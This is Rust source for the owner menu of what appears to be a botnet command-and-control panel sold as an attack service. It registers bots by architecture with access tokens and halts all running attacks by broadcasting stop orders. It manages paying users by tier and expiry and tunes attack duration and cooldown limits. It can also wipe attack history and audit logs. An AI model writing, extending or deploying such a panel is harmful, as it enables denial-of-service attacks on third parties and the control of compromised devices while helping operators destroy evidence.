use std::sync::Arc;
use tokio::io::AsyncWriteExt;
use tokio::process::Command;
use crate::modules::client_manager::Client;
use crate::modules::state::AppState;
use crate::modules::error::{Result, AuditLog, log_audit_event};
use crate::modules::auth::Level;
use super::ui::*;
use super::general::show_prompt;

pub async fn handle_owner_command(client: &Arc<Client>, state: &Arc<AppState>) -> Result<()> {
    client.write(b"\x1b[2J\x1b[3J\x1b[H").await?;
    let width = get_terminal_width();
    let side_width = 30;
    let main_width = width - side_width - 2;
    let left_col_width = 37;
    let right_col_width = main_width - left_col_width - 2;

    // Top border
    client.write(format!("\x1b[38;5;240m╭{}╦{}╮\n\r", "═".repeat(main_width - 1), "═".repeat(side_width)).as_bytes()).await?;
    
    // Title with gradient
    let title = apply_ice_gradient("Owner Menu");
    let title_text = format!("§ {} §", title);
    let title_padding = main_width - visible_len("§ Owner Menu §") - 2;
    let left_pad = title_padding / 2;
    let right_pad = title_padding - left_pad;
    client.write(format!("\x1b[38;5;240m║{}{}{}║ ●━━━━●━━━━●━━━●━━━●━━━●━━━━● ║\n\r",
        " ".repeat(left_pad), title_text, " ".repeat(right_pad)).as_bytes()).await?;
    
    // Headers
    client.write(format!("\x1b[38;5;240m╠{}╦{}╢  │    │    │    │    │    │  ║\n\r", "═".repeat(left_col_width), "═".repeat(right_col_width)).as_bytes()).await?;
    let left_hdr = apply_ice_gradient("Owner Commands");
    let right_hdr = apply_ice_gradient("System Management");
    
    let left_hdr_pad = left_col_width - visible_len("Owner Commands");
    let right_hdr_pad = right_col_width - visible_len("System Management");
    
    client.write(format!("\x1b[38;5;240m║{}{}{}║{}{}{}║░░▒▒▓▓████▓▓▒▒░░▒▒▓▓████▓▓▒▒░░║\n\r", 
        " ".repeat(left_hdr_pad / 2), left_hdr, " ".repeat(left_hdr_pad - left_hdr_pad / 2),
        " ".repeat(right_hdr_pad / 2), right_hdr, " ".repeat(right_hdr_pad - right_hdr_pad / 2)
    ).as_bytes()).await?;
    
    client.write(format!("\x1b[38;5;240m╠{}╬{}╬{}╣\n\r", "═".repeat(left_col_width), "═".repeat(right_col_width), "═".repeat(side_width)).as_bytes()).await?;
    
    // Render owner commands with panel
    for (i, item) in OWNER_COMMANDS.iter().enumerate() {
        let panel = if i < OWNER_PANEL.len() { format!(" {} ║", OWNER_PANEL[i]) } else { "                              ║".to_string() };
        
        let cmd_gradient = apply_gradient(item.cmd, 45, 51);
        let visible_cmd = visible_len(item.cmd);
        let padding_cmd = if 34 > visible_cmd { 34 - visible_cmd } else { 0 };
        let cmd_field = format!("{}{}", cmd_gradient, " ".repeat(padding_cmd));
        
        let desc_width = right_col_width - 1;
        let desc_gradient = apply_gradient(item.desc, 51, 87);
        let visible_desc = visible_len(item.desc);
        let padding_desc = desc_width.saturating_sub(visible_desc);
        let desc_field = format!("{}{}", desc_gradient, " ".repeat(padding_desc));
        
        client.write(format!("\x1b[38;5;240m║   {}║ {}║{}\n\r", cmd_field, desc_field, panel).as_bytes()).await?;
    }
    
    // Footer
    client.write(format!("\x1b[38;5;240m╰{}╩{}╯\r\n\r", "═".repeat(main_width - 1), "═".repeat(side_width)).as_bytes()).await?;
    
    client.set_breadcrumb("Home > Owner Menu").await;
    show_prompt(client, state).await?;
    Ok(())
}

pub async fn handle_regbot_command(client: &Arc<Client>, state: &Arc<AppState>, parts: &[&str]) -> Result<()> {
    let arch = match parts.get(1) {
        Some(a) => a.to_string(),
        None => {
            client.write(b"\x1b[38;5;196m[X] Usage: regbot <arch>\n\r").await?;
            return Ok(());
        }
    };
    
    match state.bot_manager.register_bot(arch.clone()).await {
        Ok((_uuid, token)) => {
            client.write(format!("\x1b[38;5;82m[✓] Bot registered successfully\n\rToken: {}\n\rArch: {}\n\r", token, arch).as_bytes()).await?;
            
            let audit_event = AuditLog::new(client.user.username.clone(), "REGISTER_BOT".to_string(), "SUCCESS".to_string())
                .with_target(arch);
            let _ = log_audit_event(audit_event, &state.audit_file).await;
        }
        Err(e) => {
            client.write(format!("\x1b[38;5;196m[X] Failed to register bot: {}\n\r", e).as_bytes()).await?;
        }
    }
    
    Ok(())
}

pub async fn handle_killall_command(client: &Arc<Client>, state: &Arc<AppState>) -> Result<()> {
    let stopped_ids = state.attack_manager.stop_all_attacks().await;
    let count = stopped_ids.len();
    
    for id in stopped_ids {
        state.bot_manager.broadcast_stop(id).await;
    }
    
    client.write(format!("\x1b[38;5;82m[✓] Stopped all {} active attacks\n\r", count).as_bytes()).await?;
    
    let audit_event = AuditLog::new(client.user.username.clone(), "KILL_ALL_ATTACKS".to_string(), "SUCCESS".to_string())
        .with_target(format!("{} attacks", count));
    let _ = log_audit_event(audit_event, &state.audit_file).await;
    
    Ok(())
}

pub async fn handle_listbackups_command(client: &Arc<Client>) -> Result<()> {
    let mut entries = tokio::fs::read_dir("backups").await?;
    let mut backups = Vec::new();
    
    while let Ok(Some(entry)) = entries.next_entry().await {
        if let Ok(metadata) = entry.metadata().await {
            if metadata.is_file() {
                backups.push(entry.file_name().to_string_lossy().into_owned());
            }
        }
    }
    
    backups.sort();
    
    client.write(b"\x1b[2J\x1b[3J\x1b[H").await?;
    client.write(b"\x1b[38;5;51m=== Available Backups ===\x1b[0m\n\r").await?;
    
    for backup in backups {
        client.write(format!("  {}\n\r", backup).as_bytes()).await?;
    }
    
    Ok(())
}

pub async fn handle_restore_command(client: &Arc<Client>, state: &Arc<AppState>, parts: &[&str]) -> Result<()> {
    let backup_name = match parts.get(1) {
        Some(n) => n.to_string(),
        None => {
            client.write(b"\x1b[38;5;196m[X] Usage: restore <backup_name>\n\r").await?;
            return Ok(());
        }
    };
    
    // Security check: Prevent path traversal and ensure valid filename
    let path = std::path::Path::new(&backup_name);
    if path.components().count() != 1 || 
       backup_name.contains("..") || 
       backup_name.contains('/') || 
       backup_name.contains('\\') {
        client.write(b"\x1b[38;5;196m[X] Invalid backup name (path traversal detected)\n\r").await?;
        return Ok(());
    }
    
    // Security check: Enforce extension
    if !backup_name.ends_with(".tar.gz") {
        client.write(b"\x1b[38;5;196m[X] Invalid backup file extension (must be .tar.gz)\n\r").await?;
        return Ok(());
    }
    
    let backup_path = std::path::Path::new("backups").join(&backup_name);
    
    // Verify the file exists and is a file (not a symlink/dir)
    if !backup_path.exists() || !backup_path.is_file() {
        client.write(format!("\x1b[38;5;196m[X] Backup '{}' not found or invalid\n\r", backup_name).as_bytes()).await?;
        return Ok(());
    }

    // Canonicalize to ensure it's truly inside backups/
    let canonical_path = match backup_path.canonicalize() {
        Ok(p) => p,
        Err(_) => {
            client.write(b"\x1b[38;5;196m[X] Failed to resolve backup path\n\r").await?;
            return Ok(());
        }
    };
    
    let backups_dir = match std::path::Path::new("backups").canonicalize() {
        Ok(p) => p,
        Err(_) => {
            // If backups dir doesn't exist, we can't restore from it
             client.write(b"\x1b[38;5;196m[X] Backups directory error\n\r").await?;
             return Ok(());
        }
    };
    
    if !canonical_path.starts_with(&backups_dir) {
        client.write(b"\x1b[38;5;196m[X] Security violation: Path traversal detected\n\r").await?;
        return Ok(());
    }
    
    // Execute restore script with piped input "yes"
    // Use the filename only, as the script expects it relative or we pass the full path?
    // The original code passed `backups/backup_name`.
    // Let's pass the relative path `backups/filename` which we know is safe now.
    let safe_path_str = format!("backups/{}", backup_name);

    let mut child = Command::new("./restore.sh")
        .arg(&safe_path_str)
        .stdin(std::process::Stdio::piped())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .spawn()?;
            
        if let Some(mut stdin) = child.stdin.take() {
            stdin.write_all(b"yes\n").await?;
        }
        
        let output = child.wait_with_output().await?;
            
        if output.status.success() {
            client.write(format!("\x1b[38;5;82m[✓] System restored successfully\n\r").as_bytes()).await?;
            let audit_event = AuditLog::new(client.user.username.clone(), "RESTORE_BACKUP".to_string(), "SUCCESS".to_string())
                .with_target(backup_name);
            let _ = log_audit_event(audit_event, &state.audit_file).await;
        } else {
            client.write(format!("\x1b[38;5;196m[X] Restore failed: {}\n\r", String::from_utf8_lossy(&output.stderr)).as_bytes()).await?;
        }
    
    Ok(())
}

pub async fn handle_db_command(client: &Arc<Client>, state: &Arc<AppState>, parts: &[&str]) -> Result<()> {
    let action = match parts.get(1) {
        Some(a) => a.to_lowercase(),
        None => {
            client.write(b"\x1b[38;5;196m[X] Usage: db <backup|restore|clear>\n\r").await?;
            return Ok(());
        }
    };
    
    match action.as_str() {
        "backup" => {
            let timestamp = chrono::Utc::now().format("%Y%m%d_%H%M%S");
            let backup_name = format!("backup_{}.tar.gz", timestamp);
            
            let output = Command::new("./backup.sh")
                .arg(&backup_name)
                .output()
                .await?;
                
            if output.status.success() {
                client.write(format!("\x1b[38;5;82m[✓] Database backed up to {}\n\r", backup_name).as_bytes()).await?;
                let audit_event = AuditLog::new(client.user.username.clone(), "DB_BACKUP".to_string(), "SUCCESS".to_string())
                    .with_target(backup_name);
                let _ = log_audit_event(audit_event, &state.audit_file).await;
            } else {
                client.write(format!("\x1b[38;5;196m[X] Backup failed: {}\n\r", String::from_utf8_lossy(&output.stderr)).as_bytes()).await?;
            }
        }
        "clear" => {
            client.write(b"\x1b[38;5;196m[!] WARNING: This will clear all data. Are you sure? (y/n): ").await?;
            let confirm = client.read_line().await?.trim().to_lowercase();
            
            if confirm == "y" {
                // Clear attack history
                tokio::fs::write("config/attack_history.json", "[]").await?;
                // Clear logs
                tokio::fs::write(&state.audit_file, "").await?;
                
                client.write(format!("\x1b[38;5;82m[✓] Database cleared\n\r").as_bytes()).await?;
                let audit_event = AuditLog::new(client.user.username.clone(), "DB_CLEAR".to_string(), "SUCCESS".to_string());
                let _ = log_audit_event(audit_event, &state.audit_file).await;
            } else {
                client.write(b"\x1b[38;5;245m[*] Operation cancelled\n\r").await?;
            }
        }
        _ => {
            client.write(b"\x1b[38;5;196m[X] Invalid action. Use: backup, restore, clear\n\r").await?;
        }
    }
    
    Ok(())
}

pub async fn handle_adduser_command(client: &Arc<Client>, state: &Arc<AppState>, parts: &[&str]) -> Result<()> {
    if parts.len() < 4 {
        client.write(b"\x1b[38;5;196m[X] Usage: adduser <username> <password> <level> [days]\n\r").await?;
        return Ok(());
    }
    
    let username = parts[1];
    let password = parts[2];
    let level_str = parts[3];
    let days = parts.get(4).and_then(|s| s.parse::<i64>().ok()).unwrap_or(30);
    
    let level = match level_str.to_lowercase().as_str() {
        "admin" => Level::Admin,
        "pro" | "reseller" | "vip" => Level::Pro,
        "basic" | "user" => Level::Basic,
        _ => {
            client.write(b"\x1b[38;5;196m[X] Invalid level. Use: admin, pro, basic\n\r").await?;
            return Ok(());
        }
    };
    
    let expire = chrono::Utc::now() + chrono::Duration::days(days);
    match state.user_manager.add_user(username.to_string(), password, expire, level).await {
        Ok(_) => {
            client.write(format!("\x1b[38;5;82m[\u{2713}] User '{}' added successfully\n\r", username).as_bytes()).await?;
            let audit_event = AuditLog::new(client.user.username.clone(), "ADD_USER".to_string(), "SUCCESS".to_string())
                .with_target(username.to_string());
            let _ = log_audit_event(audit_event, &state.audit_file).await;
        }
        Err(e) => {
            client.write(format!("\x1b[38;5;196m[X] Failed to add user: {}\n\r", e).as_bytes()).await?;
        }
    }
    
    Ok(())
}

pub async fn handle_deluser_command(client: &Arc<Client>, state: &Arc<AppState>, parts: &[&str]) -> Result<()> {
    let username = match parts.get(1) {
        Some(u) => u.to_string(),
        None => {
            client.write(b"\x1b[38;5;196m[X] Usage: deluser <username>\n\r").await?;
            return Ok(());
        }
    };
    
    if username == client.user.username {
        client.write(b"\x1b[38;5;196m[X] You cannot delete yourself\n\r").await?;
        return Ok(());
    }
    
    match state.user_manager.delete_user(&username).await {
        Ok(_) => {
            // Kick if online
            let clients = state.client_manager.get_all_clients().await;
            if let Some(target) = clients.iter().find(|c| c.user.username == username) {
                target.write(b"\n\r\x1b[38;5;196m[!] Your account has been deleted\n\r").await?;
                state.client_manager.remove_client(&target.id).await;
            }
            
            client.write(format!("\x1b[38;5;82m[✓] User '{}' deleted successfully\n\r", username).as_bytes()).await?;
            let audit_event = AuditLog::new(client.user.username.clone(), "DELETE_USER".to_string(), "SUCCESS".to_string())
                .with_target(username);
            let _ = log_audit_event(audit_event, &state.audit_file).await;
        }
        Err(e) => {
            client.write(format!("\x1b[38;5;196m[X] Failed to delete user: {}\n\r", e).as_bytes()).await?;
        }
    }
    
    Ok(())
}

pub async fn handle_changepass_command(client: &Arc<Client>, state: &Arc<AppState>, parts: &[&str]) -> Result<()> {
    if parts.len() < 3 {
        client.write(b"\x1b[38;5;196m[X] Usage: changepass <username> <new_password>\n\r").await?;
        return Ok(());
    }
    
    let username = parts[1];
    let new_pass = parts[2];
    
    match state.user_manager.change_password(username, new_pass).await {
        Ok(_) => {
            client.write(format!("\x1b[38;5;82m[✓] Password changed for user '{}'\n\r", username).as_bytes()).await?;
            let audit_event = AuditLog::new(client.user.username.clone(), "CHANGE_PASSWORD".to_string(), "SUCCESS".to_string())
                .with_target(username.to_string());
            let _ = log_audit_event(audit_event, &state.audit_file).await;
        }
        Err(e) => {
            client.write(format!("\x1b[38;5;196m[X] Failed to change password: {}\n\r", e).as_bytes()).await?;
        }
    }
    
    Ok(())
}

pub async fn handle_clearlogs_command(client: &Arc<Client>, state: &Arc<AppState>) -> Result<()> {
    client.write(b"\x1b[38;5;196m[!] WARNING: This will clear all system logs. Are you sure? (y/n): ").await?;
    let confirm = client.read_line().await?.trim().to_lowercase();
    
    if confirm == "y" {
        tokio::fs::write(&state.audit_file, "").await?;
        client.write(b"\x1b[38;5;82m[\xE2\x9C\x93] System logs cleared\n\r").await?;
        
        let audit_event = AuditLog::new(client.user.username.clone(), "CLEAR_LOGS".to_string(), "SUCCESS".to_string());
        let _ = log_audit_event(audit_event, &state.audit_file).await;
    } else {
        client.write(b"\x1b[38;5;245m[*] Operation cancelled\n\r").await?;
    }
    
    Ok(())
}

pub async fn handle_userchange_command(client: &Arc<Client>, state: &Arc<AppState>, parts: &[&str]) -> Result<()> {
    if parts.len() < 3 {
        client.write(b"\x1b[38;5;196m[X] Usage: userchange <username> <level|expiry> <value>\n\r").await?;
        return Ok(());
    }
    
    let username = parts[1];
    let field = parts[2].to_lowercase();
    let value = parts[3];
    
    let (level, expire) = match field.as_str() {
        "level" => {
            let new_level = match value.to_lowercase().as_str() {
                "admin" => Level::Admin,
                "pro" | "reseller" | "vip" => Level::Pro,
                "basic" | "user" => Level::Basic,
                _ => {
                    client.write(b"\x1b[38;5;196m[X] Invalid level\n\r").await?;
                    return Ok(());
                }
            };
            (Some(new_level), None)
        }
        "expiry" => {
            if let Ok(days) = value.parse::<i64>() {
                (None, Some(chrono::Utc::now() + chrono::Duration::days(days)))
            } else {
                client.write(b"\x1b[38;5;196m[X] Invalid days value\n\r").await?;
                return Ok(());
            }
        }
        _ => {
            client.write(b"\x1b[38;5;196m[X] Invalid field. Use: level, expiry\n\r").await?;
            return Ok(());
        }
    };

    match state.user_manager.update_user(username, level, expire).await {
        Ok(_) => {
            client.write(format!("\x1b[38;5;82m[✓] User '{}' updated successfully\n\r", username).as_bytes()).await?;
            let audit_event = AuditLog::new(client.user.username.clone(), "UPDATE_USER".to_string(), "SUCCESS".to_string())
                .with_target(format!("{} {}", username, field));
            let _ = log_audit_event(audit_event, &state.audit_file).await;
        }
        Err(e) => {
            client.write(format!("\x1b[38;5;196m[X] User '{}' not found or update failed: {}\n\r", username, e).as_bytes()).await?;
        }
    }
    
    Ok(())
}

pub async fn handle_whitelist_command(client: &Arc<Client>, state: &Arc<AppState>, parts: &[&str]) -> Result<()> {
    let ip_str = match parts.get(1) {
        Some(i) => i.to_string(),
        None => {
            client.write(b"\x1b[38;5;196m[X] Usage: whitelist <ip>\n\r").await?;
            return Ok(());
        }
    };
    
    let ip = match ip_str.parse::<std::net::IpAddr>() {
        Ok(ip) => ip,
        Err(_) => {
            client.write(b"\x1b[38;5;196m[X] Invalid IP address\n\r").await?;
            return Ok(());
        }
    };

    state.whitelist.insert(ip);
    
    client.write(format!("\x1b[38;5;82m[✓] IP {} added to whitelist\n\r", ip).as_bytes()).await?;
    
    let audit_event = AuditLog::new(client.user.username.clone(), "WHITELIST_IP".to_string(), "SUCCESS".to_string())
        .with_target(ip.to_string());
    let _ = log_audit_event(audit_event, &state.audit_file).await;
    
    Ok(())
}

pub async fn handle_blacklist_command(client: &Arc<Client>, state: &Arc<AppState>, parts: &[&str]) -> Result<()> {
    let ip_str = match parts.get(1) {
        Some(i) => i.to_string(),
        None => {
            client.write(b"\x1b[38;5;196m[X] Usage: blacklist <ip>\n\r").await?;
            return Ok(());
        }
    };
    
    let ip = match ip_str.parse::<std::net::IpAddr>() {
        Ok(ip) => ip,
        Err(_) => {
            client.write(b"\x1b[38;5;196m[X] Invalid IP address\n\r").await?;
            return Ok(());
        }
    };

    state.blacklist.insert(ip);
    
    client.write(format!("\x1b[38;5;82m[✓] IP {} added to blacklist\n\r", ip).as_bytes()).await?;
    
    let audit_event = AuditLog::new(client.user.username.clone(), "BLACKLIST_IP".to_string(), "SUCCESS".to_string())
        .with_target(ip.to_string());
    let _ = log_audit_event(audit_event, &state.audit_file).await;
    
    Ok(())
}

pub async fn handle_config_command(client: &Arc<Client>, state: &Arc<AppState>, parts: &[&str]) -> Result<()> {
    if parts.len() < 3 {
        client.write(b"\x1b[38;5;196m[X] Usage: config <key> <value>\n\r").await?;
        return Ok(());
    }
    
    let key = parts[1];
    let value = parts[2];
    
    let mut config = state.config.write().await;
    let mut updated = false;

    match key {
        "max_attacks" => {
            if let Ok(v) = value.parse::<usize>() {
                config.max_attacks = v;
                updated = true;
            }
        }
        "max_bot_connections" => {
            if let Ok(v) = value.parse::<usize>() {
                config.max_bot_connections = v;
                updated = true;
            }
        }
        "max_user_connections" => {
            if let Ok(v) = value.parse::<usize>() {
                config.max_user_connections = v;
                updated = true;
            }
        }
        "session_timeout_secs" => {
            if let Ok(v) = value.parse::<u64>() {
                config.session_timeout_secs = v;
                updated = true;
            }
        }
        "attack_cooldown_secs" => {
            if let Ok(v) = value.parse::<u64>() {
                config.attack_cooldown_secs = v;
                updated = true;
            }
        }
        "max_attack_duration_secs" => {
            if let Ok(v) = value.parse::<u64>() {
                config.max_attack_duration_secs = v;
                updated = true;
            }
        }
        "log_level" => {
            config.log_level = value.to_string();
            updated = true;
        }
        _ => {
            client.write(format!("\x1b[38;5;196m[X] Unknown config key: {}\n\r", key).as_bytes()).await?;
            return Ok(());
        }
    }

    if updated {
        if let Err(e) = config.save() {
             client.write(format!("\x1b[38;5;196m[X] Failed to save config: {}\n\r", e).as_bytes()).await?;
        } else {
             client.write(format!("\x1b[38;5;82m[✓] Config updated: {} = {}\n\r", key, value).as_bytes()).await?;
             let audit_event = AuditLog::new(client.user.username.clone(), "UPDATE_CONFIG".to_string(), "SUCCESS".to_string())
                .with_target(format!("{}={}", key, value));
             let _ = log_audit_event(audit_event, &state.audit_file).await;
        }
    } else {
        client.write(format!("\x1b[38;5;196m[X] Invalid value for key: {}\n\r", key).as_bytes()).await?;
    }
    
    Ok(())
}

pub async fn handle_tokens_command(client: &Arc<Client>, state: &Arc<AppState>) -> Result<()> {
    let tokens = state.bot_manager.list_tokens().await;
    
    client.write(b"\x1b[2J\x1b[3J\x1b[H").await?;
    client.write(b"\x1b[38;5;51m=== Registered Bot Tokens ===\x1b[0m\n\r").await?;
    client.write(format!("{:<38} | {:<10} | {:<20} | {:<20}\n\r", "Bot ID", "Arch", "Created", "Last Used").as_bytes()).await?;
    client.write(b"---------------------------------------+------------+----------------------+----------------------\n\r").await?;
    
    for token in tokens {
        let last_used = token.last_used.map(|t| t.format("%Y-%m-%d %H:%M:%S").to_string()).unwrap_or_else(|| "Never".to_string());
        client.write(format!("{:<38} | {:<10} | {:<20} | {:<20}\n\r", 
            token.bot_id, 
            token.arch, 
            token.created_at.format("%Y-%m-%d %H:%M:%S"), 
            last_used
        ).as_bytes()).await?;
    }
    
    Ok(())
}

pub async fn handle_revoke_command(client: &Arc<Client>, state: &Arc<AppState>, parts: &[&str]) -> Result<()> {
    let bot_id_str = match parts.get(1) {
        Some(id) => id,
        None => {
            client.write(b"\x1b[38;5;196m[X] Usage: revoke <bot_id>\n\r").await?;
            return Ok(());
        }
    };
    
    let bot_id = match uuid::Uuid::parse_str(bot_id_str) {
        Ok(id) => id,
        Err(_) => {
            client.write(b"\x1b[38;5;196m[X] Invalid Bot ID format\n\r").await?;
            return Ok(());
        }
    };
    
    match state.bot_manager.revoke_token(bot_id).await {
        Ok(_) => {
            client.write(format!("\x1b[38;5;82m[✓] Token revoked for bot {}\n\r", bot_id).as_bytes()).await?;
            let audit_event = AuditLog::new(client.user.username.clone(), "REVOKE_TOKEN".to_string(), "SUCCESS".to_string())
                .with_target(bot_id.to_string());
            let _ = log_audit_event(audit_event, &state.audit_file).await;
        }
        Err(e) => {
            client.write(format!("\x1b[38;5;196m[X] Failed to revoke token: {}\n\r", e).as_bytes()).await?;
        }
    }
    
    Ok(())
}
